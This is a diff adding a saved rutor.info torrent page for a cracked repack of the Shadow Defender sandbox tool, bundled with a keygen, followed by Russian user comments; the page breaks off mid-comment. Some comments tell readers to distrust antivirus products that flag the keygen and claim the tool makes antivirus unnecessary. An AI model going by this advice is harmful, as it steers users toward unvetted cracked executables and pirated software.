@@ -1,0 +1,398 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: Shadow Defender 1.4.0.680 Final (2018) PC | + RePack by elchupakabra</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>Shadow Defender 1.4.0.680 Final (2018) PC | + RePack by elchupakabra</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:79d3788dc29defdc31d26dbb3137e49474c4be08&amp;dn=rutor.info_Shadow+Defender+1.4.0.680+Final+%282018%29+PC+%7C+%2B+RePack+by+elchupakabra&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=351465"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/351465"><img src="http://s.rutor.info/t/down.png"> Скачать Shadow_Defender_1.4.0.680__Rus__Repack.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><hr /><hr /><img src="http://s019.radikal.ru/i602/1604/3f/4fc35731443c.png" style="float:right;" /><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<li><b>Версия программы</b>: 1.4.0.680<br />
+<li><b>Официальный сайт</b>: <a href="http://www.shadowdefender.com/index.html" target="_blank">ссылка</a><br />
+<li><b>Язык интерфейса</b>: Русский / Английский<br />
+<li><b>Лечение</b>: В комплекте / не требуется (инсталлятор уже пролечен)<br />
+<li><b>Тип лекарства</b>: кейген<br />
+<br />
+<br />
+<br />
+<li><b><u>Системные требования</u></b>:<br />
+<img src="http://s013.radikal.ru/i324/1508/b3/bd532b0f09a3.png" /><br />
+<i>Operating System: Windows 2000 / XP / 2003 / Vista / Windows 7 / Windows 8 / Windows 10<br />
+<b>Memory by OS</b>: 2000: 128MB, XP: 256MB, 2003: 256MB, Vista: 512MB, Windows 7: 1GB, Windows 8 / 10: 1GB<br />
+Hard Disk: 3 MB for program files, 10MB or more free space for each partition in Shadow Mode</i><br />
+<br />
+<br />
+<br />
+<li><b><u>Описание</u></b>:<br />
+<i><b>Shadow Defender</b></i> - это новый аналог программы, подобной ShadowUser, позволяющей поставить систему в режим тени - Shadow mode, при котором вам не грозят ни удаление важной информации, ни атака вирусов. Эта утилита так же служит для обеспечения защиты компьютера и конфиденциальности информации. Предотвращает нежелательные и злонамеренные изменения в вашем компьютере, позволяет загружаться в виртуальном теневом режиме с выборочным сохранением данных, проста в обращении.<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Дополнительная информация:</div><div class="hidebody"></div><textarea class="hidearea">Shadow Defender создаёт виртуальный снимок указанного жёсткого диска, с которым вы и продолжаете свою работу. Атаки червей, скачивание spyware, удаление Ваших любимых фотографий и т.п... всё будет возвращено назад после очередной перезагрузки компьютера. Удобным моментом является и то, что переход в режим Shadow в Shadow Defender - не требует перезагрузки системы. Есть и ряд просто полезных улучшений, как например экспорт/импорт списка исключений в файл/из файла.</textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Особенности программы:</div><div class="hidebody"></div><textarea class="hidearea"><li>Защита от всех вирусов и вредоносных программ.<br />
+<li>Защита системы от нежелательных изменений.<br />
+<li>Безопасное тестирование игрового и программного обеспечения.<br />
+<li>Безопасный серфинг в интернете.<br />
+<li>Ликвидация простоев системы и эксплуатационных расходов.<br />
+<li>Перезагрузка для восстановления системы в первоначальное состояние.</li></li></li></li></li></li></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Изменения:</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://www.shadowdefender.com/history.html" target="_blank">http://www.shadowdefender.com/history.html</a></textarea></div><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://lostpic.net/image/MtvH" target="_blank"><img src="http://img10.lostpic.net/2016/05/03/aecd51c1797272a6967ad06feaf847a3.th.jpg" /></a> <a href="http://lostpic.net/image/MtvM" target="_blank"><img src="http://img10.lostpic.net/2016/05/03/62551437d1a97be8f03f76e2e58c4032.th.jpg" /></a> <a href="http://lostpic.net/image/MtvQ" target="_blank"><img src="http://img10.lostpic.net/2016/05/03/7258b7a04b2298d71a008c7ce03b9de7.th.jpg" /></a> <a href="http://lostpic.net/image/Mtvc" target="_blank"><img src="http://img10.lostpic.net/2016/05/03/137c34726a0cd7207e9c88fea1d087a6.th.jpg" /></a></textarea></div><hr /><hr /></li></li></li></li></li></li></li></td></tr>
+
+<tr><td class="header">Оценка</td><td>9.8 из 10 (13 голосов, самая низкая оценка - 8, самая высокая - 10)</td></tr>
+<tr><td class="header">Категория</td><td><a href="/soft" target="_blank">Софт </a></td></tr>
+<tr><td class="header">Раздают</td><td>14</td></tr>
+<tr><td class="header">Качают</td><td>0</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 7:19:05 (6 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 20:32:53  (11 час назад)</td></tr>
+<tr><td class="header">Размер</td><td>9.68&nbsp;MB  (10145618 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 351465);">закладки</span></td>
+</tr>
+
+
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/351465.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (21)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=351465">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(351465);">Промодерировать раздачу</span> | <span onclick="confirm_delete(351465);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/351465">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h"><td><b>k.d.r. 69</b></td> <td>09-05-2018 3:22:27 (4 часа назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3199661"></span><script type="text/javascript">cOptions(817041,3199661);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо Вам Большое !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>13-11-2017 16:08:29 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3096051"></span><script type="text/javascript">cOptions(805410,3096051);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />СтоГрамм</fieldset> - я не знаю - не удалил пост по той причине - что может акция до сих пор актуальна?? - проверьте кто-нить и отпишитесь.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>СтоГрамм</b></td> <td>13-11-2017 13:56:36 (6 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_3096006"></span><script type="text/javascript">cOptions(1484205,3096006);</script></td></tr><tr><td class="c_t" colspan=4>-=DoMiNo=-<br />
+Я вас не понял,написано лицензия до 30.10 значит уже ваш пост бесполезен или нет.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>gedie</b></td> <td>13-11-2017 12:01:27 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3095956"></span><script type="text/javascript">cOptions(1452902,3095956);</script></td></tr><tr><td class="c_t" colspan=4><b>pyronaut</b> Я конечно не в курсе всей ситуации, но может лучше комп починить?)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>27-10-2017 7:12:12 (6 месяцев назад)</td> <td></td> <td align="right"><span id="c_3084059"></span><script type="text/javascript">cOptions(805410,3084059);</script></td></tr><tr><td class="c_t" colspan=4><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Бесплатная лицензия Shadow Defender - Предложение действует до 30 октября 2017 года</div><div class="hidebody"></div><textarea class="hidearea"><b>1</b>. Скачайте программу по следующей ссылке: <a href="https://yadi.sk/d/O3DjGdv23P8eF2" target="_blank">https://yadi.sk/d/O3DjGdv23P8eF2</a><br />
+<br />
+Воспользуйтесь официальным файлом русификации. Замените файл res.ini в папке установки программы.<br />
+<br />
+<b>Поддерживаемые ОС</b>: Windows 10 / 8.1 / 8 / 7 / Vista 32|64-bit.<br />
+<br />
+<b>2</b>. Установите программу на компьютер, активация выполнится автоматически.<br />
+<br />
+<b>Условия предложения</b><br />
+Это пожизненная лицензия на 1 ПК для некоммерческого (персонального) использования.<br />
+Нет бесплатных обновлений до новой версии, при обновлении включится пробный период.<br />
+Бесплатная техническая поддержка по электронной почте.</textarea></div></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Don29</b></td> <td>12-04-2017 16:38:50 (13 месяца назад)</td> <td></td> <td align="right"><span id="c_2975404"></span><script type="text/javascript">cOptions(61556,2975404);</script></td></tr><tr><td class="c_t" colspan=4><b>Pozetives</b><br />
+С помощью программы Revo Uninstaller.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>pyronaut</b></td> <td>17-11-2016 12:27:32 (18 месяцев назад)</td> <td></td> <td align="right"><span id="c_2876892"></span><script type="text/javascript">cOptions(787788,2876892);</script></td></tr><tr><td class="c_t" colspan=4>За сутки работы компьютера (без подключения к интернет), в строке &quot;Занято Shadow Defender&quot; набегает около 1.5 гига. Сейчас подключился к интернет и за сутки уже набежало два с половиной гига. Это нормально? Или нужно раз в сутки перезапускать комп? Или сколько гигов информации можно в этом кэше хранить? <br />
+Я всё это спрашиваю потому у меня комп серьёзно повреждён и чем реже я его включаю/выключаю/перезапускаю, тем безопаснее.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>GennadiyTUT</b></td> <td>21-10-2016 13:38:14 (19 месяцев назад)</td> <td></td> <td align="right"><span id="c_2858854"></span><script type="text/javascript">cOptions(84727,2858854);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Сама программа (антивирусы) потребляют ОЧЕНЬ много ресурсов по (даже) сравнению с стандарт. программами виндовса.</fieldset> Что за чушь, вы просто не умеете готовить, например если каспером пройти всю систему полностью, то после он будет проверять, только новые файлы и не будет жрать ресурсы.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Boris Nic</b></td> <td>16-09-2016 20:58:27 (20 месяцев назад)</td> <td></td> <td align="right"><span id="c_2835932"></span><script type="text/javascript">cOptions(1293110,2835932);</script></td></tr><tr><td class="c_t" colspan=4>Несколько вопросов по программе:<br />
+- сильно &quot;грузит&quot; систему? Без нее чуть быстрее или нет?<br />
+- для применения на планшетах пойдет? Имеется ввиду, что на планшетах память флеш. А программа постоянно что-то записывает-удаляет. Не будет более быстрого износа?<br />
+- кто длительно пользовался - как отзывы?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>veqo</b></td> <td>05-08-2016 11:56:21 (21 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2808588"></span><script type="text/javascript">cOptions(165282,2808588);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>nsdt</b> писал:<br />...с одной стороны это ++++(вирусов не будет 100%) , а у тех у кого меняеются настройки (скайп, вибер, ...... реестр и.п.) от других программ ,, это не очень.. всё будет как в день сурка...</fieldset><br />
+В программе есть опция для сохранения сделанных изменений, а так же папки/файлы исключения.<br />
+К примеру, у меня игра на диске D, а её сохранения и настройки в C. В сабже включена защита только диска С и соответственно сохранения и настройки игры вернутся к старым значениям.<br />
+Поэтому открываем программу (обязательно в выключенном режиме защиты), заходим во вкладку &quot;исключения&quot; и выбираем то, что нужно, в моём случае это папка по адресу выше.<br />
+Ну и всё, все изменения на диске С аннулируются при перезагрузке, но файлы в этой папке останутся не тронутыми.<br />
+Кстати ниже, кто-то писал, что нужно всё время включать прогу вручную, но опять-таки в ней есть опция включения защиты автоматом при загрузке компа.  </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>nsdt</b></td> <td>01-08-2016 0:29:33 (22 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2806386"></span><script type="text/javascript">cOptions(28839,2806386);</script></td></tr><tr><td class="c_t" colspan=4>зашел, почитал коменты и просто не удержался от ..<br />
+антивирус по определению - это база данных вирусов что ЕСТЬ в нете ...., много чего,<br />
+и сама прога (каспер,есет и.т.д) даст вам знать что он нашёл то или иное (вирус) совпадение со своей базой, заблокирует и.т.п. Сама программа (антивирусы) потребляют ОЧЕНЬ много ресурсов по (даже) сравнению с стандарт. программами виндовса.<br />
+Эта программа что в раздачи - ПЕСОЧНИЦА - т.е. после перезагрузки системы она восстановит все файлы в том виде как они были до &quot;Shadow Defender&quot; т.е. будут там полезные файлы или вирусы - она их всех удалит!(восстановит как было до перезагрузки) с одной стороны это ++++(вирусов не будет 100%) , а у тех у кого меняеются настройки (скайп, вибер, ...... реестр и.п.) от других программ ,, это не очень..  всё будет как в <b>день сурка :)</b><br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Kinomany</b></td> <td>15-07-2016 8:20:54 (22 месяца назад)</td> <td></td> <td align="right"><span id="c_2798227"></span><script type="text/javascript">cOptions(449560,2798227);</script></td></tr><tr><td class="c_t" colspan=4>Потому-что это все одни и те же люди, я даже не говорю человек. Наивные вы все какие-то.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Magnit55</b></td> <td>04-05-2016 12:23:54 (24 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2757150"></span><script type="text/javascript">cOptions(570119,2757150);</script></td></tr><tr><td class="c_t" colspan=4>Автор RePack_by_KpoJIuK а у тебя в шапке RePack by D!akov</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>boroda63</b></td> <td>05-04-2016 23:35:14 (25 месяцев назад)</td> <td></td> <td align="right"><span id="c_2738657"></span><script type="text/javascript">cOptions(492265,2738657);</script></td></tr><tr><td class="c_t" colspan=4><b>&quot;Прога работает в постоянном режиме как антивирус, или ее надо каждый раз включать самому?&quot;</b><br />
+Совершенно верно: &quot;ее надо каждый раз включать самому&quot;.<br />
+Несмотря на заверение Don29 о необходимости &quot;антивиря&quot;, можно обойтись без него.<br />
+И что самое интересное, она даст тебе сто процентную гарантию от любого говна что лезет в твой комп (&quot;антивирей&quot; с такой защитой просто ещё не придумали).<br />
+<b>Единственное неудобство это: <br />
+1. Включать вручную.<br />
+2. Сохранять все свои изменения на другом диске, предварительно сняв галочку в настройках Shadow Defender с этого диска (убрать защиту).</b><br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Don29</b></td> <td>05-04-2016 18:23:07 (25 месяцев назад)</td> <td></td> <td align="right"><span id="c_2738451"></span><script type="text/javascript">cOptions(61556,2738451);</script></td></tr><tr><td class="c_t" colspan=4><b>dep87</b><br />
+Это не антивирус, ставь программу на пару с антивирем.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dep87</b></td> <td>05-04-2016 11:21:01 (25 месяцев назад)</td> <td></td> <td align="right"><span id="c_2738204"></span><script type="text/javascript">cOptions(814971,2738204);</script></td></tr><tr><td class="c_t" colspan=4>Пару нубских вопросов. Прога работает в постоянном режиме как антивирус, или ее надо каждый раз  включать самому? Если я нуб, удалю антивирус и поставлю эту прогу - не убью ли я по рукожопости своей систему и не подхвачу ли вирус какой, пока не изучу эту прогу?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>KotSema</b></td> <td>27-11-2015 20:05:07 (30 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2641139"></span><script type="text/javascript">cOptions(826108,2641139);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо. Кстати данная раздача является еще и лакмусовой бумажкой для того, чтобы узнать каким антивирусом стоит пользоваться, а каким нет: прогоните на virustotal файл keygen из данной раздачи и не используйте никогда те антивирусы, которые посчитали его вирусом.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>STORO</b></td> <td>14-02-2015 15:16:30 (39 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2373298"></span><script type="text/javascript">cOptions(835177,2373298);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо! Полезная прога.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kgb25</b></td> <td>07-02-2015 19:21:48 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2366462"></span><script type="text/javascript">cOptions(1263212,2366462);</script></td></tr><tr><td class="c_t" colspan=4>Шикарно! До этого замучался переустанавливать ОС. А то, что и мне ничерта не дает делать, можно смириться. Дай бог, чтобы было актуально подольше. Спасибо <img src="http://s.rutor.info/t/smilies/thumbsup.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>unitech</b></td> <td>22-01-2015 22:07:56 (40 месяцев назад)</td> <td></td> <td align="right"><span id="c_2349615"></span><script type="text/javascript">cOptions(5329,2349615);</script></td></tr><tr><td class="c_t" colspan=4>Вот скажите, что случилось с этими ... программистами. Как можно выпускать новую версию раз в неделю. Если программа сырая, так незачем и распространять, еще и за деньги. А если это готовый продукт - так какого каждую неделю щлёпать новую версию.<br />
+Собственно именно эта программа нужная и полезная. Но всё равно я прав!<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>zalmans85</b></td> <td>04-01-2015 21:05:12 (41 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2330403"></span><script type="text/javascript">cOptions(257090,2330403);</script></td></tr><tr><td class="c_t" colspan=4><b>gendav</b>, так ведь в проге настраиваются исключения (посмотрите на скриншоты). Например, у меня Хром на диске С:/, внес в исключения папку &quot;C:UsersVadimAppDataLocalGoogleChromeUser Data&quot; и вся история с закладками и паролями сохраняются в защищенном режиме (Win-7), также сделал с пользовательскими папками (документы, закачки и т.п.), зато программные файлы под защитой (хотя никто не мешает внести в исключения и каталоги программ). В этой версии, судя по всему, даже исключения реестра можно создавать.<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>gendav</b></td> <td>04-01-2015 2:39:00 (41 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2329677"></span><script type="text/javascript">cOptions(714993,2329677);</script></td></tr><tr><td class="c_t" colspan=4>Хорошая прога! Плюс я использую Outpostpro 9.0 , надо быть очень внимательным при всех закачках и установках прог на С: , вы всё потеряете при любой перезагрузке Windows.<br />
+Все настройки тоже вернутся в состояние до включения защищённого режима. Перед установкой рекомендую настроить все параметры в программах установленных на С: по вашим потребностям, дабы всё не перенастраивать после рестарта. Я часто используемые проги ставлю на другие диски и браузеры тоже, тогда они всеравно находятся под антивирусом, но плюс все изменения и история браузеров сохраняется как и без включения Defendera. А так как Defender в виртуалке с вашим интернетом на С, то всё под защитой. Если у вас несколько хардов, то не советую все ставить под защиту, иначе всё что и там происходило ( закачки, новые файлы ), всё пропадёт после любого рестарта системы.<br />
+<br />
+Спасибо раздающему за свежую прогу!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>smersch</b></td> <td>16-11-2014 21:00:00 (42 месяца назад)</td> <td>Оценил на: <b>8</b></td> <td align="right"><span id="c_2283930"></span><script type="text/javascript">cOptions(1213616,2283930);</script></td></tr><tr><td class="c_t" colspan=4>хорошая песочница,хотелось за годы изменения в дизайне а по работе всё класс.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Antoxa Zlo</b></td> <td>09-11-2014 11:17:22 (43 месяца назад)</td> <td></td> <td align="right"><span id="c_2274815"></span><script type="text/javascript">cOptions(1161373,2274815);</script></td></tr><tr><td class="c_t" colspan=4><i><b><u>Обновлено</u> до версии</b> - 1.4.0.561</i></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SergAS70</b></td> <td>02-09-2014 16:41:28 (45 месяцев назад)</td> <td></td> <td align="right"><span id="c_2220326"></span><script type="text/javascript">cOptions(25033,2220326);</script></td></tr><tr><td class="c_t" colspan=4>demo771 можете хоть пять разных антивирей поставить. проге это неважно. Она незанимается выявлением вирусов а значит конфликта с антивирями небудет.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>demo771</b></td> <td>06-08-2014 9:52:40 (46 месяцев назад)</td> <td></td> <td align="right"><span id="c_2203242"></span><script type="text/javascript">cOptions(806587,2203242);</script></td></tr><tr><td class="c_t" colspan=4>Будет ли мешать Нод-32 рабате этой программе и вообще можно ли установить эту прогу с антивирусом вместе </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Don29</b></td> <td>04-08-2014 11:43:46 (46 месяцев назад)</td> <td></td> <td align="right"><span id="c_2201920"></span><script type="text/javascript">cOptions(61556,2201920);</script></td></tr><tr><td class="c_t" colspan=4><b>vitan230381</b><br />
+<br />
+Это не антивирус, просто данный софт создаёт теневой диск, а после перезагрузки системы, всё возвращается на прежний период, т.е. система остаётся нетронутой. В исключения добавляются те папки, в которых любые изменения будут сохранены, например папка драйверов, или папка с торрентами, браузеров, чтобы при перезагрузке ничего не пропало. Именно на это и нужно нацелить внимание.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>vitan230381</b></td> <td>02-08-2014 19:49:22 (46 месяцев назад)</td> <td></td> <td align="right"><span id="c_2200836"></span><script type="text/javascript">cOptions(1126051,2200836);</script></td></tr><tr><td class="c_t" colspan=4>Don29 а какие папки к примеру?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Don29</b></td> <td>02-08-2014 9:41:12 (46 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2200409"></span><script type="text/javascript">cOptions(61556,2200409);</script></td></tr><tr><td class="c_t" colspan=4>Отличная программа! Использую её уже более 3 лет, и никаких антивирусов не нужно! Главное, внимательно её использовать, необходимые папки включать в исключения, чтобы данные при сохранении не пропали. Рекомендую!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>anatoliydn2</b></td> <td>01-08-2014 18:30:07 (46 месяцев назад)</td> <td></td> <td align="right"><span id="c_2199989"></span><script type="text/javascript">cOptions(598960,2199989);</script></td></tr><tr><td class="c_t" colspan=4>это не антивирус-это гораздо круче...</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>vitan230381</b></td> <td>01-08-2014 1:16:15 (46 месяцев назад)</td> <td></td> <td align="right"><span id="c_2199427"></span><script type="text/javascript">cOptions(1126051,2199427);</script></td></tr><tr><td class="c_t" colspan=4>старый антивирус надо удалять? чтоб этот поставить</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>26-04-2014 17:34:51 (49 месяцев назад)</td> <td></td> <td align="right"><span id="c_2139832"></span><script type="text/javascript">cOptions(805410,2139832);</script></td></tr><tr><td class="c_t" colspan=4><span style="font-family:Georgia;"><i><b><u>Обновлено</u> до версии</b> - 